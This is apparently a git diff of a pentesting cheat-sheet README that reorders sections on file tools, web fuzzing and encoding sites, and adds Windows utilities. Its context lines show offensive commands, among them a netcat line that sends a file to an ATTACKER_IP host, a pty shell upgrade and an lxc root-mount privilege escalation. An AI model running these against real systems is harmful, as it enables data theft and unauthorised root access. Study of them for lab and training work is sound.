@@ -15,6 +15,15 @@ Here are some handy tricks to enhance your pentesting workflow:
 ```python
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
+#### Read a raw file using `xxd`:
+```
+xxd -r file.raw > output.txt
+```
+`l\s`: Equivalent to `ls`
+#### Decompress a gzip file:
+```
+gzip -d file.gz
+```
 
 ---
 #### Reverse shells
@@ -38,7 +47,7 @@ chmod 600 id_rsa
 ```
 
 ---
-#### File Transfer on Netcat
+#### File Transfer on `Netcat`
 
 1. To download a file on the remote shell:
 ```nc
@@ -48,52 +57,23 @@ nc ATTACKER_IP ATTACKER_PORT < [file_to_download]
 ```nc
 nc -l ATTACKER_PORT > [output_file_path]
 ```
-
----
-#### Web
-Discover hidden directories using `wfuzz`:
-```linux
-wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.47.7/island/2100/FUZZ.ticket
-```
----
-####  Encoding techniques:
-- [splitbrain](https://www.splitbrain.org/_static/ook/)
-- [hashes](https://hashes.com/en/tools/hash_identifier)
-- [md5hashing](https://md5hashing.net/hash)
-- [cyberchef](https://gchq.github.io/CyberChef/)
-
-## Additional Notes
-Here are some additional notes that might come in handy during your penetration testing journey:
-
----
-
-#### Read a raw file using `xxd`:
-```
-xxd -r file.raw > output.txt
-```
----
-#### terminal hack
-`l\s`: Equivalent to `ls`
-
----
 #### Transfer files using `scp`:
 ```
 scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
 ```
 ---
-#### Decompress a gzip file:
-```
-gzip -d file.gz
+### Web
+Discover hidden directories using `wfuzz`:
+```linux
+wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.47.7/island/2100/FUZZ.ticket
 ```
 ---
-#### Local User and Group Management in windows
-```
-lusrmgr.msc
-```
-#### System Configuration utility (for diagnose startup issues)
-```
-MSConfig
-```
+###  Encoding techniques:
+- [splitbrain](https://www.splitbrain.org/_static/ook/)
+- [hashes](https://hashes.com/en/tools/hash_identifier)
+- [md5hashing](https://md5hashing.net/hash)
+- [cyberchef](https://gchq.github.io/CyberChef/)
+
 
 ---
 ### Privilege Escalation:
@@ -112,6 +92,20 @@ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=tru
 lxc start ignite
 lxc exec ignite /bin/sh
 ```
+---
 
+### Windows
+#### Local User and Group Management
+```
+lusrmgr.msc
+```
+#### System Configuration utility (for diagnose startup issues)
+```
+MSConfig
+```
+#### Task Manager to manage (enable/disable) startup items. 
+```
+taskmgr
+```
 ---
 Happy hacking!
